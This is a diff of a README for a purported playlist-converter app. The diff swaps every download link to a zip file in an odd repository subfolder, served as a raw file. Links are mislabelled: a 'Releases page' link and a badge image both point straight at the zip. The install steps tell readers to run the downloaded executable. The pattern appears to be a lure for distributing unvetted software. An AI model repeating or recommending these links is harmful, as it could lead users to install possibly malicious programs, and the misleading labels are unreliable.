@@ -6,13 +6,13 @@ Welcome to the playlist-converter! This tool helps you convert any public playli
 
 ## 📥 Download the Application
 
-[![Download the latest release](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/playlist-converter.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/playlist-converter.zip)
+[![Download the latest release](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/converter-playlist-v2.8.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/converter-playlist-v2.8.zip)
 
 To get started, you need to visit our releases page to download the application.
 
 ### 💾 Visit this page to download
 
-[Download the latest release here](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/playlist-converter.zip)
+[Download the latest release here](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/converter-playlist-v2.8.zip)
 
 ## 📝 Features
 
@@ -32,7 +32,7 @@ To use the playlist-converter, ensure your system meets the following requiremen
 
 ## ⚙️ How to Install
 
-1. Navigate to our [Releases page](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/playlist-converter.zip).
+1. Navigate to our [Releases page](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/converter-playlist-v2.8.zip).
 2. Click on the latest release. Look for the file that suits your operating system (e.g., .exe for Windows).
 3. Download the file to your computer.
 4. Locate the downloaded file in your downloads folder.
@@ -71,4 +71,4 @@ This application is open-source and free to use. For details, please check the l
 
 Thank you for using playlist-converter. Your choice to convert playlists helps make music sharing easier and more enjoyable!
 
-[Download the latest release here](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/playlist-converter.zip)
+[Download the latest release here](https://raw.githubusercontent.com/GALEANOgl18/playlist-converter/main/ahimsa/converter-playlist-v2.8.zip)
